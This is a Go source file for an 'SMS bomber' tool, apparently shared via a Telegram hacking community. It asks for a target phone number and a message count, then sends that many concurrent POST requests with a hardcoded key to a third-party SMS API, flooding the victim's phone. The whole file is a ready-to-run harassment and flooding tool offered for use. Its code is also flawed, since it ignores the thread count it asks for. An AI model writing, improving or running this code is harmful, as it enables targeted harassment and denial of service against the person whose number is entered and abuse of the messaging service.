package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "log"
    "net/http"
    "strconv"
    "sync"
    "sync/atomic"
)

func main() {
    logo := `
  _____       ___             __
 / ___/__    / _ )___  __ _  / /  ___ ____
/ (_ / _ \  / _  / _ \/  ' \/ _ \/ -_) __/
\___/\___/ /____/\___/_/_/_/_.__/\__/_/ \[@0xNaHiD]`
    fmt.Println(logo)
    fmt.Println("\033[34m---------------------------------------------------\033[0m")
    fmt.Println("   \033[36mTelegram : \033[35mhttps://t.me/EHCommunityOfficial\033[0m")
    fmt.Println("\033[34m---------------------------------------------------\033[0m")
    var number string
    var count int
    var threadCount int

    fmt.Print("  \033[33mNumber #> ")
    fmt.Scan(&number)
    fmt.Print("  \033[33mNumber of sms you want #> ")
    fmt.Scan(&count)
    fmt.Print("  \033[33mThread (1-20) #> ")
    fmt.Scan(&threadCount)

    data := map[string]string{
        "number": number,
        "key":    "nAhIdGaY",
    }
    jsonValue, _ := json.Marshal(data)

    var wg sync.WaitGroup
    wg.Add(count)

    var requestsSent int32
    fmt.Printf("\n  \033[32mStarting to send %d SMS to %s using %d threads...\033[0m\n\n", count, number, threadCount)

    for i := 0; i < count; i++ {
        go func(i int) {
            defer wg.Done()
            req, err := http.NewRequest("POST", "https://api.toxinum.xyz/v1/sms", bytes.NewBuffer(jsonValue))
            if err != nil {
                log.Fatal(err)
            }
            req.Header.Set("Content-Type", "application/json")

            client := &http.Client{}
            resp, err := client.Do(req)
            if err != nil {
                fmt.Println(err)
            }

            defer resp.Body.Close()

            // Increment the requestsSent counter atomically
            sent := strconv.Itoa(i + 1)
            fmt.Printf("  \033[36mSending %s SMS to %s\033[0m\n", sent, number)
            if sentCount := incrementRequestsSent(&requestsSent); sentCount == count {
                fmt.Printf("\n  \033[32mAll %d SMS sent to %s successfully!\033[0m\n", count, number)
            }
        }(i)
    }

    wg.Wait()
}

func incrementRequestsSent(count *int32) int {
    return int(atomic.AddInt32(count, 1))
}
